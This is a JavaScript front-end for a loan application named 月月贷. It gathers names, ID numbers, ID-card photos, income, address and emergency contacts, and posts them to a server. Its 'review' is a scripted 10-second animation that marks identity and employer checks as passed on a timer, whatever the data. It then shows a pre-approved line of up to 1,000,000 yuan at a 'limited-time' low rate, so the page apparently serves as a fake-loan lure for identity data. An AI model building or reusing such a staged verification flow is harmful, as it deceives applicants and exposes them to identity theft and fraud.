/**
 * 月月贷 - 四步资料填写（含身份证OCR自动识别）
 */
const $ = (id) => document.getElementById(id);

// ============ 工具 ============
function safeText(id, text) { const el = $(id); if (el) el.textContent = text; }
function safeStep(id, action, cls) {
  const el = $(id); if (!el) return;
  if (cls) el.classList.add(cls);
  if (action) { const icon = el.querySelector('.rs-icon'); if (icon) icon.textContent = action; }
}
function toast(msg) {
  let t = document.querySelector('.toast');
  if (!t) { t = document.createElement('div'); t.className = 'toast'; document.body.appendChild(t); }
  t.textContent = msg; t.classList.add('show');
  clearTimeout(t._tid); t._tid = setTimeout(() => t.classList.remove('show'), 1800);
}
function showConfirm(msg, onOk) {
  const overlay = $('confirmOverlay'), msgEl = $('confirmMsg'), okBtn = $('confirmOk'), cancelBtn = $('confirmCancel');
  if (!overlay || !msgEl || !okBtn || !cancelBtn) { if (confirm(msg)) onOk(); return; }
  msgEl.textContent = msg; overlay.classList.add('on');
  const cleanup = () => { overlay.classList.remove('on'); okBtn.removeEventListener('click', handleOk); cancelBtn.removeEventListener('click', handleCancel); };
  function handleOk() { cleanup(); onOk(); }
  function handleCancel() { cleanup(); }
  okBtn.addEventListener('click', handleOk); cancelBtn.addEventListener('click', handleCancel);
}

// ============ 单选框 ============
function initRtags() {
  document.querySelectorAll('.rtags').forEach(group => {
    group.addEventListener('click', (e) => {
      const tag = e.target.closest('.rtag');
      if (!tag) return;
      group.querySelectorAll('.rtag').forEach(t => t.classList.remove('sel'));
      tag.classList.add('sel');
    });
  });
}
function getRadio(groupId) {
  const el = $(groupId).querySelector('.rtag.sel');
  return el ? el.dataset.val : '';
}

// ============ 步骤导航 ============
let currentStep = 1;

function nextStep(from) {
  if (from === 1) {
    if (!validateStep1()) return;
  } else if (from === 2) {
    if (!validateStep2()) return;
  } else if (from === 3) {
    if (!validateStep3()) return;
  }
  gotoStep(from + 1);
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function prevStep(from) {
  gotoStep(from - 1);
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function gotoStep(n) {
  currentStep = n;
  document.querySelectorAll('.step-panel').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.step-panel').forEach(p => { if (p.id === 'step' + n) p.classList.add('active'); });
  updateStepIndicator(n);
}

function updateStepIndicator(n) {
  const items = document.querySelectorAll('.step-item');
  const lines = document.querySelectorAll('.step-line');
  items.forEach((item, i) => {
    const s = i + 1;
    item.classList.remove('active', 'done');
    if (s < n) item.classList.add('done');
    else if (s === n) item.classList.add('active');
  });
  lines.forEach((line, i) => {
    line.classList.toggle('done', i + 1 < n);
  });
}

// ============ 验证函数 ============
function validateStep1() {
  const name = $('name').value.trim();
  const idCard = $('idCard').value.trim();
  const gender = getRadio('genderGroup');
  const nation = $('nation').value;
  const birthday = $('birthday').value;

  if (!name) { toast('请填写姓名'); return false; }
  if (!idCard || !/^\d{17}[\dXx]$/.test(idCard)) { toast('请填写正确18位身份证号'); return false; }
  if (!gender) { toast('请选择性别'); return false; }
  if (!nation) { toast('请选择民族'); return false; }
  if (!birthday) { toast('请选择出生日期'); return false; }
  return true;
}

function validateStep2() {
  if (!$('province').value || !$('city').value || !$('district').value) { toast('请选择省/市/区'); return false; }
  if (!$('address').value.trim()) { toast('请填写详细地址'); return false; }
  return true;
}

function validateStep3() {
  if (!$('company').value.trim()) { toast('请填写单位全称'); return false; }
  if (!$('industry').value.trim()) { toast('请选择或输入行业'); return false; }
  if (!$('position').value.trim()) { toast('请选择或输入职位'); return false; }
  if (!getRadio('incomeGroup')) { toast('请选择税后月收入'); return false; }
  return true;
}

function validateStep4() {
  const cn = $('contactName').value.trim();
  const cp = $('contactPhone').value.trim();
  const rel = getRadio('relationGroup');
  if (!cn) { toast('请填写联系人姓名'); return false; }
  if (!cp || !/^1[3-9]\d{9}$/.test(cp)) { toast('请填写正确联系人手机号'); return false; }
  if (!rel) { toast('请选择与本人关系'); return false; }
  return true;
}

// ============ 民族下拉 ============
const NATIONS = [
  '汉族','蒙古族','回族','藏族','维吾尔族','苗族','彝族','壮族',
  '布依族','朝鲜族','满族','侗族','瑶族','白族','土家族',
  '哈尼族','哈萨克族','傣族','黎族','傈僳族','佤族','畲族',
  '高山族','拉祜族','水族','东乡族','纳西族','景颇族',
  '柯尔克孜族','土族','达斡尔族','仫佬族','羌族','布朗族',
  '撒拉族','毛南族','仡佬族','锡伯族','阿昌族','普米族',
  '塔吉克族','怒族','乌孜别克族','俄罗斯族','鄂温克族',
  '德昂族','保安族','裕固族','京族','塔塔尔族','独龙族',
  '鄂伦春族','赫哲族','门巴族','珞巴族','基诺族'
];
buildDrop('nationList', NATIONS, 'nation', 'nationWrap');
$('nationWrap').addEventListener('click', (e) => { e.stopPropagation(); $('nationList').classList.toggle('show'); });

// ============ 行业-职位级联下拉（可手动输入） ============
const INDUSTRY_JOBS = {
  'IT/互联网': [
    '技术总监/CTO','架构师','技术经理','项目经理',
    '前端工程师','后端工程师','全栈工程师','移动端工程师','嵌入式工程师','游戏开发工程师',
    'AI/算法工程师','大数据工程师','数据分析师','数据科学家',
    '测试工程师','自动化测试','运维工程师','DevOps/SRE','DBA','网络安全工程师',
    '产品经理','产品总监','UI设计师','UX设计师','交互设计师',
    '运营经理','运营专员','市场经理','商务经理','售前工程师','技术支持',
    '其他'
  ],
  '金融/保险': [
    '银行行长/副行长','支行经理','客户经理','柜员','大堂经理',
    '信贷经理','信贷审批员','风控经理','风控专员','合规经理',
    '理财顾问','投资顾问','基金经理','证券分析师','期货交易员',
    '保险代理人','保险理赔','精算师','核保员',
    '会计','审计师','财务经理/总监','出纳',
    '其他'
  ],
  '教育/科研': [
    '大学教师/教授','中学教师','小学教师','幼师','特殊教育教师',
    '培训讲师','职业技能培训师','留学顾问','教务管理',
    '校长/副校长','教导主任','辅导员','班主任',
    '教研员','实验室技术员','科研助理','研究员',
    '其他'
  ],
  '医疗/制药': [
    '医生/医师','主治医师','主任医师','副主任医师','住院医师',
    '护士','护士长','护师',
    '牙医/口腔医生','中医师','康复治疗师','理疗师',
    '药剂师','药师','药品研发','药品注册',
    '医学检验师','影像技师','麻醉师',
    '医药代表','医疗器械销售','医疗管理','医院行政',
    '心理咨询师','营养师','兽医',
    '其他'
  ],
  '制造业': [
    '厂长/总经理','生产经理','车间主任','班组长',
    '工业工程师','工艺工程师','质量工程师','设备工程师','电气工程师',
    '质检员','品控员','操作工','技工',
    '供应链经理','采购','仓管/物料员','物流专员',
    '安全管理员','环保专员',
    '其他'
  ],
  '建筑/房地产': [
    '项目经理','技术负责人','工地负责人',
    '建筑师','结构工程师','土木工程师','暖通工程师','给排水工程师','电气工程师',
    '造价工程师','监理工程师','施工员','安全员','质量员','材料员','测量员',
    '室内设计师','软装设计师','景观设计师',
    '房产销售','置业顾问','房产中介','估价师','招商经理',
    '物业经理','物业管理','设施管理',
    '其他'
  ],
  '餐饮/酒店': [
    '餐厅经理/店长','大堂经理','楼层经理','行政总厨',
    '厨师','面点师','配菜/打荷','厨工',
    '服务员','领班','收银员','传菜员',
    '调酒师','咖啡师','茶艺师',
    '前厅接待','客房服务员','客房经理','保洁',
    '其他'
  ],
  '零售/贸易': [
    '店长/门店经理','区域经理','运营总监','督导',
    '销售顾问','导购','收银员','理货员',
    '采购经理','采购专员','供应链管理',
    '仓管/库管','物流专员','配送主管',
    '客服经理','客服专员','售后专员',
    '陈列师','商品企划','电商运营',
    '外贸经理','外贸业务员','报关员',
    '其他'
  ],
  '政府/事业单位': [
    '公务员','事业编制人员','参公人员','合同制员工',
    '警察/民警','交警','消防员','刑警',
    '法官','检察官','书记员','司法辅助人员',
    '税务人员','市场监管','城管',
    '社区工作者','社工','网格员','辅警',
    '其他'
  ],
  '交通/物流': [
    '货车司机','出租车/网约车司机','公交车司机','代驾',
    '快递员','配送员','骑手',
    '物流经理','调度员','仓储经理','站点负责人',
    '货运代理','报关员','报检员',
    '空乘/乘务员','飞行员','机务/地勤','安检员',
    '船长','船员','港口调度','码头工人',
    '其他'
  ],
  '法律/咨询': [
    '律师','合伙人','实习律师','律师助理',
    '公司法务','法务总监','法务专员','合规专员',
    '法律顾问','知识产权顾问','专利代理人',
    '管理咨询师','战略顾问','人力资源顾问','财务顾问',
    '公证员','商标代理人','仲裁员',
    '其他'
  ],
  '文化/传媒': [
    '记者','编辑/主编','责任编辑','校对',
    '摄影师','摄像师','后期剪辑','特效师','调色师',
    '导演','副导演','编剧','制片人','场务',
    '主持人','主播','配音演员','演员',
    '经纪人','艺人统筹','宣传策划',
    '平面设计师','插画师','动画设计师','漫画师',
    '自媒体运营','自媒体博主','新媒体编辑','社群运营',
    '广告策划','文案策划','创意总监',
    '其他'
  ],
  '能源/环保': [
    '能源工程师','电力工程师','光伏工程师','风电运维工程师',
    '环保工程师','环评工程师','环境监测员','污水处理工程师',
    '新能源研发','储能技术员','充电桩运维',
    '安全管理员','项目经理','技术员',
    '其他'
  ],
  '农林牧渔': [
    '农场主/种植户','养殖户/养殖场主','渔业养殖',
    '园艺师','园林工程师','绿化养护员',
    '林业技术员','护林员',
    '兽医','畜牧师','饲料销售',
    '农机驾驶员','农业技术推广员',
    '其他'
  ],
  '美容/美发': [
    '美容师','美容顾问','美容导师','店长',
    '美发师','发型师','烫染师','美发助理',
    '化妆师','造型师','美甲师','纹绣师',
    '按摩师','足疗师','Spa技师',
    '其他'
  ],
  '体育/健身': [
    '健身教练','私人教练','团操教练','瑜伽教练','普拉提教练',
    '游泳教练','救生员',
    '运动员','裁判员','体育教师',
    '健身房经理','会籍顾问',
    '其他'
  ],
  '家政/服务': [
    '月嫂','育儿嫂','保姆/家政员','钟点工',
    '保洁员','家电清洗','家电维修',
    '搬家工','货运司机',
    '养老护理员','护工',
    '其他'
  ],
  '广告/会展': [
    '广告策划','文案','美术指导','创意总监',
    '平面设计师','3D设计师','展台设计师',
    '客户经理/AM','客户执行/AE','媒介经理',
    '会展策划','活动执行','搭建管理',
    '摄影/摄像','后期制作',
    '其他'
  ],
  '通信/运营商': [
    '通信工程师','网络优化工程师','基站维护','传输工程师',
    '客服代表','投诉处理','营业员','店长',
    '政企客户经理','渠道经理','市场专员',
    '项目经理','售前工程师',
    '其他'
  ],
  '自由职业': [
    '个体经营者/个体工商户','自由职业者',
    '网店店主','电商运营','微商',
    '独立开发者','独立设计师','独立摄影师',
    '翻译','写手/撰稿人','画师',
    '咨询顾问','培训讲师',
    '其他'
  ],
  '其他行业': ['其他']
};
const ALL_INDUSTRIES = Object.keys(INDUSTRY_JOBS);

// 行业下拉（可手动输入）
buildDrop('industryList', ALL_INDUSTRIES, 'industry', 'industryWrap');
$('industryWrap').addEventListener('click', (e) => { e.stopPropagation(); $('industryList').classList.toggle('show'); });
$('industry').addEventListener('input', function() {
  const val = this.value.trim();
  const items = val ? ALL_INDUSTRIES.filter(i => i.includes(val)) : ALL_INDUSTRIES;
  buildDrop('industryList', items, 'industry', 'industryWrap');
  $('industryList').classList.add('show');
  updatePositionList();
});
$('industry').addEventListener('change', updatePositionList);

function updatePositionList() {
  const ind = $('industry').value.trim();
  const jobs = INDUSTRY_JOBS[ind] || [];
  if (jobs.length) {
    buildDrop('positionList', jobs, 'position', 'jobWrap');
  } else {
    $('positionList').innerHTML = '<div class="sel-opt" style="color:#999">请先选择行业</div>';
  }
}

// 职位下拉（可手动输入）
$('jobWrap').addEventListener('click', (e) => { e.stopPropagation(); updatePositionList(); $('positionList').classList.toggle('show'); });
$('position').addEventListener('input', function() {
  const ind = $('industry').value.trim();
  const jobs = (INDUSTRY_JOBS[ind] || []).filter(j => j.includes(this.value.trim()));
  if (jobs.length) {
    buildDrop('positionList', jobs, 'position', 'jobWrap');
    $('positionList').classList.add('show');
  }
});

// ============ 身份证号自动填充性别/生日 ============
$('idCard').addEventListener('blur', function() {
  const v = this.value.trim();
  if (v.length === 18 && /^\d{17}[\dXx]$/.test(v)) {
    const bd = v.substring(6, 10) + '-' + v.substring(10, 12) + '-' + v.substring(12, 14);
    $('birthday').value = bd;
    const g = parseInt(v.charAt(16)) % 2 === 1 ? '男' : '女';
    $('genderGroup').querySelectorAll('.rtag').forEach(t => { t.classList.remove('sel'); if (t.dataset.val === g) t.classList.add('sel'); });
  }
});

// ============ 省市区 ============
let REGION = {}, regionReady = false;
fetch('region.json').then(res => res.json()).then(data => { REGION = data; regionReady = true; buildProvince(); }).catch(() => toast('加载地区数据失败'));
function buildProvince() {
  const list = Object.keys(REGION); if (!list.length) return;
  buildDrop('provinceList', list, 'province', 'pWrap', () => { $('city').value = ''; $('district').value = ''; $('cityList').innerHTML = ''; $('districtList').innerHTML = ''; });
}
$('pWrap').addEventListener('click', (e) => { e.stopPropagation(); $('provinceList').classList.toggle('show'); });
$('cWrap').addEventListener('click', (e) => {
  e.stopPropagation();
  if (!regionReady) { toast('数据加载中'); return; }
  const p = $('province').value; if (!p) { toast('请先选择省份'); return; }
  buildDrop('cityList', Object.keys(REGION[p]), 'city', 'cWrap', () => { $('district').value = ''; $('districtList').innerHTML = ''; });
  $('cityList').classList.toggle('show');
});
$('dWrap').addEventListener('click', (e) => {
  e.stopPropagation();
  if (!regionReady) { toast('数据加载中'); return; }
  const p = $('province').value, c = $('city').value; if (!c) { toast('请先选择城市'); return; }
  buildDrop('districtList', REGION[p][c] || [], 'district', 'dWrap');
  $('districtList').classList.toggle('show');
});

// ============ 通用下拉构建 ============
function buildDrop(containerId, items, inputId, wrapId, cb) {
  const container = $(containerId);
  container.innerHTML = items.map(item => `<div class="sel-opt" data-val="${item}">${item}</div>`).join('');
  container.querySelectorAll('.sel-opt').forEach(opt => {
    opt.addEventListener('click', (e) => { e.stopPropagation(); $(inputId).value = opt.dataset.val; container.classList.remove('show'); if (cb) cb(opt.dataset.val); });
  });
}
document.addEventListener('click', () => { document.querySelectorAll('.sel-drop.show').forEach(d => d.classList.remove('show')); });

// ============ 备注计数 ============
$('remark').addEventListener('input', function() { $('remarkLen').textContent = this.value.length; });

// ============ 身份证照片上传 + 自动OCR ============
let frontFile = null, backFile = null, isScanning = false;

function setupIdUpload(boxId, inputId, previewId, placeholderId) {
  const box = $(boxId);
  const input = $(inputId);
  const preview = $(previewId);
  const placeholder = $(placeholderId);

  // 点击整个区域触发文件选择
  box.addEventListener('click', (e) => {
    if (e.target === input) return;
    input.click();
  });

  input.addEventListener('change', () => {
    const file = input.files[0];
    if (!file) return;
    if (inputId === 'frontInput') frontFile = file;
    else backFile = file;

    const reader = new FileReader();
    reader.onload = (e) => {
      preview.src = e.target.result;
      preview.style.display = 'block';
      placeholder.style.display = 'none';
      box.classList.add('uploaded');
    };
    reader.readAsDataURL(file);

    // 自动触发OCR
    tryAutoScan();
  });
}

function tryAutoScan() {
  if (isScanning) return;
  if (!frontFile) return;  // 只需正面照即可开始识别

  isScanning = true;
  const status = $('scanStatus');
  status.textContent = '⏳ 正在自动识别身份证信息...';
  status.className = 'scan-status';

  doOcr();
}

async function doOcr() {
  const status = $('scanStatus');
  try {
    const formData = new FormData();
    if (frontFile) formData.append('front', frontFile);
    if (backFile)  formData.append('back', backFile);

    status.textContent = '⏳ 正在识别身份证信息...';
    status.className = 'scan-status';

    // 8秒超时，确保5秒内完成识别
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 8000);

    const resp = await fetch('/api/ocr-idcard', {
      method: 'POST',
      body: formData,
      signal: controller.signal
    });
    clearTimeout(timeout);

    const data = await resp.json();

    if (data.ok) {
      fillFormFromOcr(data);
      status.textContent = '✅ 识别成功，请核对修改信息';
      status.className = 'scan-status ok';
      isScanning = false;
      return;
    }

    // 服务端未配置百度OCR
    if (data.code === 'NO_CONFIG') {
      status.textContent = '⚠ 管理员未配置OCR服务，请手动填写（管理员可设置腾讯云OCR环境变量）';
      status.className = 'scan-status err';
      isScanning = false;
      return;
    }

    throw new Error(data.msg || '识别失败');
  } catch (e) {
    console.error('OCR error:', e);
    if (e.name === 'AbortError') {
      status.textContent = '⚠ 识别超时（8秒），请手动填写身份信息';
    } else {
      status.textContent = '⚠ ' + (e.message || '识别失败，请手动填写身份信息');
    }
    status.className = 'scan-status err';
    isScanning = false;
  }
}

function fillFormFromOcr(data) {
  if (data.name) $('name').value = data.name;
  if (data.idCard) $('idCard').value = data.idCard;
  if (data.gender) {
    $('genderGroup').querySelectorAll('.rtag').forEach(t => t.classList.toggle('sel', t.dataset.val === data.gender));
  }
  if (data.nation) $('nation').value = data.nation;
  if (data.birthday) $('birthday').value = data.birthday;
  if (data.validity) $('idValid').value = data.validity;
  if (data.authority) $('idAuth').value = data.authority;
  if (data.idCard) $('idCard').dispatchEvent(new Event('blur'));
}

setupIdUpload('frontUpload', 'frontInput', 'frontPreview', 'frontPlaceholder');
setupIdUpload('backUpload', 'backInput', 'backPreview', 'backPlaceholder');

// ============ 提交 ============
function submit() {
  if (!validateStep4()) return;

  const data = {
    name: $('name').value.trim(),
    idCard: $('idCard').value.trim(),
    gender: getRadio('genderGroup'),
    nation: $('nation').value,
    birthday: $('birthday').value,
    idValid: $('idValid').value.trim(),
    company: $('company').value.trim(),
    creditCode: $('creditCode').value.trim(),
    industry: $('industry').value.trim(),
    position: $('position').value.trim(),
    income: getRadio('incomeGroup'),
    companyPhone: $('companyPhone').value.trim(),
    socialBase: $('socialBase').value.trim(),
    fundBase: $('fundBase').value.trim(),
    workYears: $('workYears').value.trim(),
    province: $('province').value,
    city: $('city').value,
    district: $('district').value,
    address: $('address').value.trim(),
    liveType: getRadio('liveTypeGroup'),
    contactName: $('contactName').value.trim(),
    contactPhone: $('contactPhone').value.trim(),
    relation: getRadio('relationGroup'),
    remark: $('remark').value.trim()
  };

  showConfirm('确认提交？提交后将进入审核。', () => { startReview(data); });
}

// ============ 审核流程 ============
function startReview(data) {
  const overlay = $('reviewOverlay');
  if (!overlay) { toast('页面异常'); return; }
  overlay.classList.add('on');

  const ring = $('ringFg');
  if (!ring) return;
  const CIRCLE = 2 * Math.PI * 80;
  ring.style.stroke = '#22D3EE';
  ring.style.strokeDashoffset = '0';
  safeText('rNum', '10');
  safeText('rIcon', '⏳');
  safeText('rTitle', '审核中');
  safeText('rDesc', '系统正在核验您的资料...');
  ['rs1','rs2','rs3','rs4'].forEach(id => safeStep(id, '⏳'));
  overlay.scrollTop = 0;

  let sec = 0;
  const timer = setInterval(() => {
    sec++; const remain = 10 - sec;
    safeText('rNum', String(remain));
    ring.style.strokeDashoffset = CIRCLE * (sec / 10);

    if (sec === 1) { safeStep('rs1', '✅', 'done'); safeText('rDesc', '正在核验身份信息...'); }
    if (sec === 3) { safeStep('rs2', '✅', 'done'); safeText('rDesc', '正在核验单位信息...'); }
    if (sec === 5) { safeStep('rs3', '✅', 'done'); }
    if (sec === 7) { safeStep('rs4', '✅', 'done'); }
    if (sec === 8) { ring.style.stroke = '#EAB308'; }

    if (sec >= 10) { clearInterval(timer); ring.style.strokeDashoffset = CIRCLE; safeText('rNum', '0'); submitToServer(data); }
  }, 1000);
}

async function submitToServer(data) {
  const ring = $('ringFg');
  const session = new URLSearchParams(location.search).get('session') || '';
  if (!session) { toast('会话已过期，请重新扫码'); return; }

  try {
    const resp = await fetch('/api/submit', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ session, data })
    });
    const result = await resp.json();
    if (!result.ok) { toast(result.msg || '提交失败'); $('reviewOverlay').classList.remove('on'); return; }

    if (result.passed) {
      ring.style.stroke = '#10B981';
      safeText('rIcon', '✅'); safeText('rTitle', '审核通过'); safeText('rDesc', '您的资料已审核通过');
      ['rs1','rs2','rs3','rs4'].forEach(id => safeStep(id, '✅', 'done'));
    } else {
      ring.style.stroke = '#EF4444';
      safeText('rIcon', '❌'); safeText('rTitle', '审核未通过'); safeText('rDesc', '身份信息核验异常');
      safeStep('rs1', '❌', 'fail');
    }
    setTimeout(() => showResult(data, result.passed, result.amount), 600);
  } catch (e) {
    toast('网络异常，审核失败'); $('reviewOverlay').classList.remove('on');
  }
}

function showResult(data, passed, amount) {
  const bg = $('resultModal'), box = $('modalBox');
  if (!bg || !box) return;

  if (passed) {
    const amt = (amount || 100) * 10000;
    box.innerHTML = `
      <div class="loan-page">
        <div class="loan-blue-bg">
          <div class="loan-card">
            <div class="loan-label"><span class="ll-dia">&#9671;</span> 可借额度 (元) <span class="ll-dia">&#9671;</span></div>
            <div class="loan-amount">${amt.toLocaleString()}</div>
            <button class="loan-btn" onclick="goHome()">返回首页</button>
            <div class="loan-rate">年化利率(单利) <b>3%</b>~<b>8%</b><span class="rate-tag">限时优惠</span></div>
          </div>
        </div>
        <div class="loan-info" style="text-align:center;padding:20px 16px">
          <span style="font-size:17px;font-weight:700;color:#15803D">✅ 预审批通过</span>
        </div>
      </div>`;
    bg.classList.add('loan-mode');
  } else {
    bg.classList.remove('loan-mode');
    box.innerHTML = `
      <div class="modal-fail-head"><div class="modal-fail-icon">❌</div><div class="modal-fail-title">审核未通过</div></div>
      <div class="modal-body">
        <div class="modal-item"><span class="mi-l">原因</span><span class="mi-v" style="color:#EF4444">身份信息不一致</span></div>
        <div class="modal-item"><span class="mi-l">建议</span><span class="mi-v">请核对身份证信息后重新提交</span></div>
      </div>
      <div class="modal-footer"><button class="modal-btn primary" onclick="reset()">重新填写</button></div>`;
  }
  bg.classList.add('on');
}

function esc(s) { if (!s) return ''; const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
function maskId(id) { return id ? id.substring(0, 3) + '****' + id.slice(-4) : ''; }

window.goHome = function() {
  const token = new URLSearchParams(location.search).get('token') || '';
  const session = new URLSearchParams(location.search).get('session') || '';
  location.href = `/home.html?token=${encodeURIComponent(token)}&session=${encodeURIComponent(session)}&v=2`;
};

window.reset = function() {
  const rm = $('resultModal'), ro = $('reviewOverlay');
  if (rm) rm.classList.remove('on');
  if (ro) ro.classList.remove('on');
  document.querySelectorAll('.finp').forEach(el => el.value = '');
  document.querySelectorAll('.ftarea').forEach(el => el.value = '');
  document.querySelectorAll('.rtag.sel').forEach(el => el.classList.remove('sel'));
  const rl = $('remarkLen'); if (rl) rl.textContent = '0';
  const cl = $('cityList'); if (cl) cl.innerHTML = '';
  const dl = $('districtList'); if (dl) dl.innerHTML = '';
  // 重置身份证照片
  frontFile = null; backFile = null; isScanning = false;
  document.querySelectorAll('.idcard-preview').forEach(p => { p.style.display = 'none'; p.src = ''; });
  document.querySelectorAll('.idcard-placeholder').forEach(p => p.style.display = 'flex');
  document.querySelectorAll('.idcard-box').forEach(b => b.classList.remove('uploaded'));
  document.querySelectorAll('.idcard-file').forEach(f => f.value = '');
  const ss = $('scanStatus'); if (ss) { ss.textContent = ''; ss.className = 'scan-status'; }
  buildProvince();
  gotoStep(1);
  window.scrollTo(0, 0);
};

// ============ 初始化 ============
initRtags();
